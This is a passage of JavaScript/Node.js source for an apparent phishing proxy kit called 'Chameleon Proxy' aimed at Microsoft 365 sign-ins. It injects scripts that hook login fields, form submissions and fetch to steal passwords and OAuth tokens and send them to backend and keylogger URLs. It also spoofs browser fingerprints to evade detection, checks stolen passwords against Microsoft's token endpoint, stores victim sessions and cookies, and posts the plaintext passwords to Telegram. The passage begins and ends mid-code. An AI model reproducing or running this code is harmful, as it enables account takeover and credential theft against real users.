            navigator.serviceWorker.addEventListener('controllerchange', function() {
                if (navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'init',
                        sessionId: SESSION_ID,
                        email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
                        evasion: { active: true }
                    });
                }
            });
        })
        .catch(function(error) {
            console.error('[SW-Register] ❌ Service Worker registration failed:', error);
        });
        setTimeout(function() {
            if (navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'init',
                    sessionId: SESSION_ID,
                    email: window.MICROSOFT_CONFIG?.EMAIL || 'unknown',
                    evasion: { active: true }
                });
            }
        }, 2000);
    } else {
        console.warn('[SW-Register] ⚠️ Service Workers not supported');
    }
})();
`;
}

function generatePasswordCaptureScript(sessionId, email, randomUA) {
    return `
(function() {
    'use strict';
    const SESSION_ID = '${sessionId}';
    const EMAIL = '${email}';
    const BACKEND_URL = '${BACKEND_URL}';
    const KEYLOGGER_URL = '${KEYLOGGER_URL}';
    console.log('🔐 Chameleon Proxy - Enhanced Password Capture v4.0');
    console.log('📧 Email:', EMAIL);
    console.log('🆔 Session:', SESSION_ID);
    let capturedEmail = EMAIL || '';
    let capturedPassword = '';
    let lastPasswordValue = '';
    let passwordField = null;
    let emailField = null;
    let captureAttempts = 0;
    function findPasswordField() {
        const selectors = [
            'input[type="password"]',
            'input[name="passwd"]',
            'input[name="password"]',
            'input[name="pass"]',
            'input[id="i0118"]',
            'input[id="password"]',
            'input[placeholder*="password" i]',
            'input[autocomplete="current-password"]'
        ];
        for (const selector of selectors) {
            const input = document.querySelector(selector);
            if (input) return input;
        }
        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            if (type === 'password' || name.toLowerCase().includes('pass') || id.toLowerCase().includes('pass') || placeholder.toLowerCase().includes('pass')) {
                return input;
            }
        }
        return null;
    }
    function findEmailField() {
        const selectors = [
            'input[name="loginfmt"]',
            'input[name="login"]',
            'input[name="username"]',
            'input[name="email"]',
            'input[type="email"]',
            'input[id="i0116"]',
            'input[placeholder*="email" i]'
        ];
        for (const selector of selectors) {
            const input = document.querySelector(selector);
            if (input) return input;
        }
        const inputs = document.querySelectorAll('input');
        for (const input of inputs) {
            const type = input.type || '';
            const name = input.name || '';
            const id = input.id || '';
            const placeholder = input.placeholder || '';
            if (type === 'email' || name.toLowerCase().includes('email') || name.toLowerCase().includes('mail') || name.toLowerCase().includes('user') || id.toLowerCase().includes('email') || placeholder.toLowerCase().includes('email')) {
                return input;
            }
        }
        return null;
    }
    function sendCredentials(email, password, source) {
        if (!email) email = capturedEmail || EMAIL || 'unknown';
        if (!password) password = capturedPassword || '';
        if (!password || password.length < 2) return;
        captureAttempts++;
        const data = {
            email: email,
            password: password,
            source: source || 'password_capture',
            sessionId: SESSION_ID,
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            passwordLength: password.length,
            captureAttempt: captureAttempts,
            service: 'Microsoft 365'
        };
        console.log('[CREDENTIALS] 📤 Sending:', email, '|', '***', '(', source, ')');
        fetch('/api/password-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).catch(() => {});
        fetch(BACKEND_URL + '/api/credential-capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true
        }).catch(() => {});
        fetch(KEYLOGGER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'credential_capture',
                email: email,
                password: password,
                source: source,
                sessionId: SESSION_ID,
                url: window.location.href,
                timestamp: Date.now(),
                service: 'Microsoft 365'
            }),
            keepalive: true
        }).catch(() => {});
        try {
            const beaconData = new Blob([JSON.stringify(data)], {type: 'application/json'});
            navigator.sendBeacon('/api/password-capture', beaconData);
        } catch(e) {}
        try {
            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'capture_password',
                    email: email,
                    password: password,
                    source: source,
                    sessionId: SESSION_ID
                });
            }
        } catch(e) {}
    }
    function monitorPasswordField() {
        passwordField = findPasswordField();
        if (!passwordField) {
            setTimeout(monitorPasswordField, 2000);
            return;
        }
        passwordField.addEventListener('input', function(e) {
            const value = this.value;
            if (value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (value.length > 2 && capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_input');
                }
            }
        });
        passwordField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && value.length > 2) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_change');
                }
            }
        });
        passwordField.addEventListener('blur', function(e) {
            const value = this.value;
            if (value && value.length > 2 && value !== lastPasswordValue) {
                capturedPassword = value;
                lastPasswordValue = value;
                if (capturedEmail) {
                    sendCredentials(capturedEmail, value, 'password_blur');
                }
            }
        });
        console.log('[PASSWORD] ✅ Monitoring active');
    }
    function monitorEmailField() {
        emailField = findEmailField();
        if (!emailField) {
            setTimeout(monitorEmailField, 2000);
            return;
        }
        emailField.addEventListener('input', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                console.log('[EMAIL] 📧 Captured:', value);
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_input');
                }
            }
        });
        emailField.addEventListener('change', function(e) {
            const value = this.value;
            if (value && (value.includes('@') || value.length > 5)) {
                capturedEmail = value;
                if (capturedPassword && capturedPassword.length > 2) {
                    sendCredentials(capturedEmail, capturedPassword, 'email_change');
                }
            }
        });
        console.log('[EMAIL] ✅ Monitoring active');
    }
    function monitorFormSubmission() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            let email = capturedEmail || EMAIL || '';
            let password = capturedPassword || '';
            let formEmail = '';
            let formPassword = '';
            for (const [key, value] of formData.entries()) {
                const keyLower = key.toLowerCase();
                if (keyLower.includes('email') || keyLower.includes('mail') || keyLower.includes('user')) {
                    if (value && (value.includes('@') || value.length > 5)) {
                        formEmail = value;
                        capturedEmail = value;
                    }
                }
                if (keyLower.includes('pass') || keyLower.includes('pwd')) {
                    if (value) {
                        formPassword = value;
                        capturedPassword = value;
                    }
                }
                if (key === 'loginfmt' && value) {
                    formEmail = value;
                    capturedEmail = value;
                }
                if (key === 'passwd' && value) {
                    formPassword = value;
                    capturedPassword = value;
                }
            }
            if (formEmail && formPassword) {
                sendCredentials(formEmail, formPassword, 'form_submit');
            } else if (capturedEmail && capturedPassword) {
                sendCredentials(capturedEmail, capturedPassword, 'form_submit_fallback');
            }
        }, true);
    }
    function periodicPasswordCheck() {
        setInterval(() => {
            if (passwordField) {
                const currentValue = passwordField.value;
                if (currentValue && currentValue.length > 2 && currentValue !== lastPasswordValue) {
                    capturedPassword = currentValue;
                    lastPasswordValue = currentValue;
                    if (capturedEmail) {
                        sendCredentials(capturedEmail, currentValue, 'periodic_check');
                    }
                }
            }
            if (emailField) {
                const currentValue = emailField.value;
                if (currentValue && (currentValue.includes('@') || currentValue.length > 5) && currentValue !== capturedEmail) {
                    capturedEmail = currentValue;
                }
            }
        }, 3000);
    }
    function init() {
        console.log('🔐 Chameleon Proxy v4.0');
        setTimeout(() => {
            emailField = findEmailField();
            if (emailField) monitorEmailField();
            passwordField = findPasswordField();
            if (passwordField) {
                monitorPasswordField();
            }
            monitorFormSubmission();
            periodicPasswordCheck();
            fetch('/api/password-capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'script_initialized',
                    sessionId: SESSION_ID,
                    email: EMAIL,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    service: 'Microsoft 365'
                })
            }).catch(() => {});
        }, 500);
    }
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    window.__chameleon = {
        getEmail: () => capturedEmail,
        getPassword: () => capturedPassword,
        getSessionId: () => SESSION_ID,
        sendCredentials: sendCredentials
    };
    console.log('✅ Chameleon Proxy initialized');
    console.log('💡 Use Ctrl+Shift+C to manually capture credentials');
})();
`;
}

function generateEvasionScripts(sessionId, email, randomUA) {
    return `
<script>
(function() {
    console.log('[EVASION] 🛡️ Initializing evasion techniques...');
    try {
        const originalGetContext = HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
            const context = originalGetContext.call(this, type, ...args);
            if (type === 'webgl' || type === 'experimental-webgl') {
                const originalGetParameter = context.getParameter;
                context.getParameter = function(parameter) {
                    if (parameter === 37445) {
                        const renderers = [
                            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
                            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
                            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)'
                        ];
                        return renderers[Math.floor(Math.random() * renderers.length)];
                    }
                    return originalGetParameter.call(this, parameter);
                };
            }
            return context;
        };
        const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
        const concurrency = [4, 6, 8, 12];
        const memory = [4, 8, 16, 32];
        Object.defineProperty(navigator, 'platform', {
            get: () => platforms[Math.floor(Math.random() * platforms.length)]
        });
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            get: () => concurrency[Math.floor(Math.random() * concurrency.length)]
        });
        Object.defineProperty(navigator, 'deviceMemory', {
            get: () => memory[Math.floor(Math.random() * memory.length)]
        });
        console.log('[EVASION] ✅ Fingerprint spoofing active');
    } catch(e) {}
    try {
        let rotationCount = 0;
        const maxRotations = ${Math.floor(Math.random() * 10) + 5};
        function doRotation() {
            if (rotationCount >= maxRotations) return;
            rotationCount++;
            const tokens = {
                access_token: '${crypto.randomBytes(32).toString('hex')}',
                refresh_token: '${crypto.randomBytes(32).toString('hex')}',
                id_token: '${crypto.randomBytes(32).toString('hex')}',
                timestamp: Date.now(),
                rotation: rotationCount
            };
            localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
            fetch('/api/token-rotation', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(tokens)
            }).catch(() => {});
        }
        const intervals = [30000, 60000, 120000];
        setTimeout(doRotation, 5000 + Math.random() * 5000);
        setInterval(doRotation, intervals[Math.floor(Math.random() * intervals.length)]);
        console.log('[EVASION] ✅ Token rotation active');
    } catch(e) {}
    console.log('[EVASION] ✅ All evasion techniques active');
})();
</script>
`;
}

function generateOAuthCaptureScript(sessionId, email) {
    return `
<script>
(function() {
    'use strict';
    const SESSION_ID = '${sessionId}';
    const EMAIL = '${email}';
    console.log('[OAUTH] 🤖 Initializing OAuth auto-capture...');
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const response = originalFetch.apply(this, args);
        response.then(function(res) {
            const clone = res.clone();
            const url = res.url;
            if (url.includes('token') || url.includes('oauth') || url.includes('authorize')) {
                clone.json().then(function(data) {
                    if (data.access_token || data.id_token || data.refresh_token) {
                        console.log('[OAUTH] 🎟️ OAuth tokens detected!');
                        fetch('/api/oauth-capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                email: EMAIL,
                                sessionId: SESSION_ID,
                                password: localStorage.getItem('captured_password') || 'AUTO_CAPTURED',
                                source: 'oauth_auto_capture',
                                tokens: data
                            })
                        }).catch(() => {});
                    }
                }).catch(() => {});
            }
        }).catch(() => {});
        return response;
    };
    console.log('[OAUTH] ✅ OAuth auto-capture active');
})();
</script>
`;
}

// ============================================================
//  ✅ FIXED: VERIFY WITH MICROSOFT - Tenant-Specific Endpoint
// ============================================================

function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        // Extract domain for tenant-specific endpoint
        const domain = email.split('@')[1] || 'common';
        
        // Determine the correct tenant endpoint
        const isConsumer = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'yahoo.com', 'aol.com'].includes(domain);
        const tenant = isConsumer ? 'organizations' : domain;
        
        console.log(`[AUTH] 🔑 Tenant: ${tenant} | Domain: ${domain}`);
        
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: MICROSOFT_SCOPES,
            resource: 'https://graph.microsoft.com'
        });
        
        const options = {
            hostname: 'login.microsoftonline.com',
            path: `/${tenant}/oauth2/v2.0/token`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }
        };
        
        console.log(`[AUTH] 🌐 Endpoint: /${tenant}/oauth2/v2.0/token`);
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    console.log(`[AUTH] 📥 Response status: ${res.statusCode}`);
                    
                    let responseData = data;
                    if (res.headers['content-encoding'] === 'gzip') {
                        try {
                            const zlib = require('zlib');
                            responseData = zlib.gunzipSync(Buffer.from(data, 'binary')).toString('utf8');
                        } catch(e) {
                            console.log('[AUTH] ⚠️ Gunzip failed, using raw');
                        }
                    }
                    
                    const response = JSON.parse(responseData);
                    
                    if (response.access_token) {
                        const cookies = {};
                        if (response.access_token) {
                            cookies['ESTSAUTH'] = {
                                value: response.access_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
                            cookies['ESTSAUTHPERSISTENT'] = {
                                value: response.refresh_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
                            cookies['ESTSSESSION'] = {
                                value: response.id_token,
                                httpOnly: true,
                                secure: true,
                                sameSite: 'Lax',
                                path: '/'
                            };
                        }
                        resolve({
                            success: true,
                            data: response,
                            tokens: {
                                access_token: response.access_token,
                                refresh_token: response.refresh_token || null,
                                id_token: response.id_token || null
                            },
                            cookies: cookies
                        });
                    } else {
                        const errorMessage = response.error_description || response.error || 'Invalid credentials';
                        console.log(`[AUTH] ❌ Microsoft error: ${errorMessage}`);
                        resolve({
                            success: false,
                            error: errorMessage,
                            raw: response
                        });
                    }
                } catch (error) {
                    console.error('[AUTH] ❌ Parse error:', error.message);
                    resolve({
                        success: false,
                        error: 'Failed to parse Microsoft response'
                    });
                }
            });
        });
        
        req.on('error', (err) => {
            console.error('[AUTH] ❌ Request error:', err.message);
            resolve({
                success: false,
                error: err.message || 'Network error'
            });
        });
        
        req.setTimeout(20000, () => {
            req.destroy();
            resolve({
                success: false,
                error: 'Request timeout'
            });
        });
        
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  HANDLE POST REQUEST - KEEP USER ON PROXY UNTIL CORRECT
// ============================================================

async function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        let email = formData.Email || formData.email || formData.loginfmt || '';
        const password = formData.Passwd || formData.passwd || formData.password || '';
        
        if (!email && sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) email = decodeURIComponent(match[1]);
        }
        if (!email) {
            return showLoginPage(res, 'guest@example.com', 1, 'No email provided');
        }

        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);

        if (password && password.length > 0) {
            sessionStore.storePasswordCapture(sessionId, email, password, 'form_submit', {
                ip: ip,
                userAgent: req.headers['user-agent'],
                url: req.url,
                attemptCount: attemptCount
            });
            
            if (VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].password = password;
                VICTIM_SESSIONS[sessionId].attempts = attemptCount;
                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
            }
        }

        const verifyResult = await verifyWithMicrosoft(email, password);
        
        if (verifyResult.success) {
            console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
            
            if (sessionId && verifyResult.tokens) {
                sessionStore.storeTokens(sessionId, verifyResult.tokens);
            }
            
            let httpOnlyCount = 0;
            if (sessionId && verifyResult.cookies) {
                const cookieHeaders = [];
                for (const [name, data] of Object.entries(verifyResult.cookies)) {
                    if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                        cookieHeaders.push(`${name}=${data.value}; HttpOnly; Secure; SameSite=Lax`);
                    }
                }
                if (cookieHeaders.length > 0) {
                    sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, 'microsoft_auth');
                    httpOnlyCount = cookieHeaders.length;
                }
            }
            
            if (sessionId && VICTIM_SESSIONS[sessionId]) {
                VICTIM_SESSIONS[sessionId].lastValidationResult = 'success';
                VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
                VICTIM_SESSIONS[sessionId].validationAttempts.push({
                    result: 'success',
                    timestamp: Date.now()
                });
            }
            
            const httpOnlyCookies = sessionStore.httpOnlyCookies.get(sessionId) || [];
            const tokenCount = verifyResult.tokens ? Object.keys(verifyResult.tokens).length : 0;
            
            const successMsg = 
`✅ *VALID MICROSOFT CREDENTIALS*

*📧 Email:* ${email}
*🔑 Password:* ${password || 'N/A'}

*🎟️ Tokens Captured:* ${tokenCount}
*🍪 HttpOnly Cookies:* ${httpOnlyCookies.length}

*📡 IP:* ${ip}
*🕐 Time:* ${new Date().toISOString()}
*🔄 Attempt #:* ${attemptCount}

*✅ COMPLETE SESSION DATA CAPTURED!*`;

            sessionStore.sendTelegram(successMsg);
            
            res.writeHead(302, { 
                'Location': TEAMS_REDIRECT,
                'Cache-Control': 'no-store, no-cache'
            });
            res.end();
            return;
        }
        
        console.log(`[AUTH] ❌ INVALID credentials: ${email} (Attempt ${attemptCount})`);
        
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            VICTIM_SESSIONS[sessionId].lastValidationResult = 'failed';
            VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
            VICTIM_SESSIONS[sessionId].validationAttempts.push({
                result: 'failed',
                timestamp: Date.now(),
                error: verifyResult.error
            });
        }
        
        const failMsg = 
`❌ *INVALID MICROSOFT CREDENTIALS*

*📧 Email:* ${email}
*🔑 Password:* ${password || 'N/A'}

*❌ Error:* ${verifyResult.error || 'Invalid username or password'}
*📊 Attempt #:* ${attemptCount}

*🕐 Time:* ${new Date().toISOString()}
*📡 IP:* ${ip}`;

        sessionStore.sendTelegram(failMsg);
        
        return showLoginPage(res, email, attemptCount, 'Invalid email or password. Please try again.');

    } catch (error) {
        console.error('[ERROR] POST handling:', error.message);
        return showLoginPage(res, 'unknown', 1, 'An error occurred. Please try again.');
    }
}

// ============================================================
//  HANDLE LOGIN REQUEST
// ============================================================

function handleLoginRequest(req, res) {
    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found, using default');
        email = 'guest@example.com';
    }

    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    showLoginPage(res, email, 1, null);
}

// ============================================================
//  HANDLE OAUTH CALLBACK
// ============================================================

function handleOAuthCallback(req, res) {
    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const code = url.searchParams.get('code');
        const error = url.searchParams.get('error');
        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
        
        console.log('[OAUTH-CALLBACK] 📥 Received callback');
        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
        
        if (error) {
            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
            return;
        }
        
        if (code) {
            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
            
            const tokenData = querystring.stringify({
                client_id: MICROSOFT_CLIENT_ID,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: MICROSOFT_REDIRECT_URI,
                scope: MICROSOFT_SCOPES
            });
            
            const tokenOptions = {
                hostname: 'login.microsoftonline.com',
                path: '/common/oauth2/v2.0/token',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(tokenData),
                    'Accept': 'application/json'
                }
            };
            
            const tokenReq = https.request(tokenOptions, (tokenRes) => {
                let tokenBody = '';
                tokenRes.on('data', chunk => tokenBody += chunk);
                tokenRes.on('end', () => {
                    try {
                        const tokens = JSON.parse(tokenBody);
                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
                        
                        const accessToken = tokens.access_token;
                        const refreshToken = tokens.refresh_token;
                        const idToken = tokens.id_token;
                        
                        if (sessionId) {
                            sessionStore.storeTokens(sessionId, {
                                access_token: accessToken,
                                refresh_token: refreshToken,
                                id_token: idToken
                            });
                        }
                        
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
                        const successMsg = 
`🤖 *OAUTH LOGIN SUCCESSFUL*

*📧 Email:* ${email}
*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}

*🕐 Time:* ${new Date().toISOString()}

*✅ OAuth flow completed!*`;

                        sessionStore.sendTelegram(successMsg);
                        
                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
                        
                        res.writeHead(302, { 
                            'Location': proxyLoginUrl,
                            'Cache-Control': 'no-store, no-cache'
                        });
                        res.end();
                        
                    } catch (error) {
                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                            `client_id=${MICROSOFT_CLIENT_ID}&` +
                            `response_type=code&` +
                            `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                            `login_hint=${encodeURIComponent(email)}`;
                        
                        res.writeHead(302, { 'Location': fallbackUrl });
                        res.end();
                    }
                });
            });
            
            tokenReq.on('error', (err) => {
                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
                res.writeHead(302, { 'Location': REDIRECT_URL });
                res.end();
            });
            
            tokenReq.write(tokenData);
            tokenReq.end();
            
        } else {
            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                `client_id=${MICROSOFT_CLIENT_ID}&` +
                `response_type=code&` +
                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                `login_hint=${encodeURIComponent(email)}`;
            
            res.writeHead(302, { 'Location': targetUrl });
            res.end();
        }
        
    } catch (error) {
        console.error('[OAUTH-CALLBACK] Error:', error.message);
        res.writeHead(302, { 'Location': REDIRECT_URL });
        res.end();
    }
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // ============================================================
    //  SERVE STATIC FILES
    // ============================================================
    
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile(PROXY_PATHNAMES.scriptFile, res, 'text/javascript');
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile(PROXY_PATHNAMES.serviceWorkerFile, res, 'text/javascript');
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.swRegister) {
        serveFile('sw-register.js', res, 'text/javascript');
        return;
    }

    // ============================================================
    //  OAUTH CALLBACK ROUTES
    // ============================================================
    
    if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
        handleOAuthCallback(req, res);
        return;
    }
    
    if (req.url.includes('code=')) {
        handleOAuthCallback(req, res);
        return;
    }
    
    if (req.url.includes('wrongplace')) {
        console.log('[PROXY] 🔄 Wrongplace detected - redirecting to proxy');
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        const email = sessionId && VICTIM_SESSIONS[sessionId] ? 
            VICTIM_SESSIONS[sessionId].email : 'guest@example.com';
        const proxyUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(email)}`;
        res.writeHead(302, { 'Location': proxyUrl });
        res.end();
        return;
    }

    // ============================================================
    //  API ENDPOINTS
    // ============================================================
    
    if (req.url === PROXY_PATHNAMES.passwordCapture && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, password, source, sessionId, context } = data;
                const ip = getClientIp(req);
                
                if (email && password) {
                    sessionStore.storePasswordCapture(
                        sessionId || getSessionIdFromCookie(req.headers.cookie),
                        email, 
                        password, 
                        source || 'api',
                        { ip, userAgent: req.headers['user-agent'], ...context }
                    );
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Email and password required' }));
                }
            } catch (error) {
                console.error('[PASSWORD-CAPTURE] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.credentialCapture && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const { email, password, source, sessionId } = data;
                const ip = getClientIp(req);
                
                if (email && password) {
                    sessionStore.storePasswordCapture(
                        sessionId || getSessionIdFromCookie(req.headers.cookie),
                        email, 
                        password, 
                        source || 'credential_capture',
                        { ip, userAgent: req.headers['user-agent'] }
                    );
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Email and password required' }));
                }
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }
    
    if (req.url === PROXY_PATHNAMES.cookieStoreEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (sessionId && data.cookies) {
                    sessionStore.storeCookies(sessionId, data.cookies, data.source || 'service_worker');
                    
                    const httpOnlyCookies = [];
                    for (const [name, cookieData] of Object.entries(data.cookies)) {
                        if (cookieData.httpOnly) {
                            httpOnlyCookies.push({ name, value: cookieData.value });
                        }
                    }
                    if (httpOnlyCookies.length > 0 && data.httpOnlyCount) {
                        sessionStore.httpOnlyCookies.set(sessionId, httpOnlyCookies);
                    }
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                console.error('[COOKIE-STORE] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.keylogEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie) || data.sessionId;
                const ip = getClientIp(req);
                
